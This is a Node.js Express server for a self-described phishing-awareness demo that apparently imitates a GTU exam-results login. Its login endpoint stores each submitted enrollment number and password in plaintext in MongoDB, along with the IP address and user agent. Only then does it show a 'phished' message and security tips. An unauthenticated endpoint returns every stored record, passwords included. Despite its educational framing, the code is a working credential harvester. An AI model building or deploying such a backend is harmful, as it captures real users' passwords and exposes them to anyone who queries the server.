const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
require('dotenv').config();

const Submission = require('./models/Submission');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// MongoDB Connection
const connectDB = async () => {
  try {
    const conn = await mongoose.connect(process.env.MONGODB_URL, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log(`MongoDB connected: ${conn.connection.host}`);
  } catch (error) {
    console.error(`Error connecting to MongoDB: ${error.message}`);
    // Continue running even if MongoDB connection fails for now
  }
};

connectDB();

// Security tips for the warning page
const SECURITY_TIPS = [
  {
    title: "Check the URL",
    description: "Always verify the website URL in the address bar. Phishing sites often use similar-looking URLs with slight variations (gturesults.in vs gtuResults-online.com)"
  },
  {
    title: "Look for HTTPS and Lock Icon",
    description: "Legitimate websites use HTTPS encryption. Look for the green lock icon in the address bar before entering sensitive information."
  },
  {
    title: "Verify the Domain",
    description: "Check the domain name carefully. Attackers often register domains that look similar to legitimate ones. GTU's official domain is gturesults.in"
  },
  {
    title: "Never Click Suspicious Links",
    description: "If you receive unexpected links via email or messages claiming to be from GTU or your college, don't click them directly. Navigate to the official website instead."
  },
  {
    title: "Be Cautious of Urgency and Requests for Credentials",
    description: "Phishing emails often create urgency or request personal information. Legitimate institutions never ask for passwords via email or links."
  }
];

// POST endpoint for login (stores data in MongoDB)
app.post('/api/login', async (req, res) => {
  const { enrollmentNo, password, exam, captcha, session } = req.body;

  try {
    // Get user IP and user agent for logging
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    // Create a new submission record
    const submission = new Submission({
      session: session || 'Winter 2025',
      exam,
      enrollmentNo,
      password,
      captcha,
      ipAddress,
      userAgent,
    });

    // Save to MongoDB
    await submission.save();
    console.log(`✓ Data saved for Enrollment: ${enrollmentNo}`);

    // Return phishing response
    res.status(200).json({
      phished: true,
      message: "This is a phishing simulation",
      tips: SECURITY_TIPS,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error(`Error saving submission: ${error.message}`);
    
    // Still return phishing response even if save fails
    res.status(200).json({
      phished: true,
      message: "This is a phishing simulation",
      tips: SECURITY_TIPS,
      timestamp: new Date().toISOString(),
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

// GET endpoint to fetch all submissions (for admin/educational purposes)
app.get('/api/submissions', async (req, res) => {
  try {
    const submissions = await Submission.find().sort({ createdAt: -1 });
    res.status(200).json({
      count: submissions.length,
      data: submissions,
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET endpoint for statistics
app.get('/api/submissions/stats', async (req, res) => {
  try {
    const totalSubmissions = await Submission.countDocuments();
    
    // Group by exam
    const examStats = await Submission.aggregate([
      {
        $group: {
          _id: '$exam',
          count: { $sum: 1 },
        },
      },
    ]);

    // Group by session
    const sessionStats = await Submission.aggregate([
      {
        $group: {
          _id: '$session',
          count: { $sum: 1 },
        },
      },
    ]);

    res.status(200).json({
      totalSubmissions,
      examStats,
      sessionStats,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.status(200).json({ status: 'Server is running' });
});

// Simple welcome endpoint
app.get('/', (req, res) => {
  res.status(200).json({
    message: 'Phishing Awareness Demo Backend - Educational Project',
    endpoints: {
      login: 'POST /api/login (stores submission in MongoDB)',
      submissions: 'GET /api/submissions (view all stored submissions)',
      stats: 'GET /api/submissions/stats (view statistics)',
      health: 'GET /api/health'
    }
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Phishing Awareness Demo server running on http://localhost:${PORT}`);
  console.log('This is an EDUCATIONAL project for cybersecurity awareness.');
});
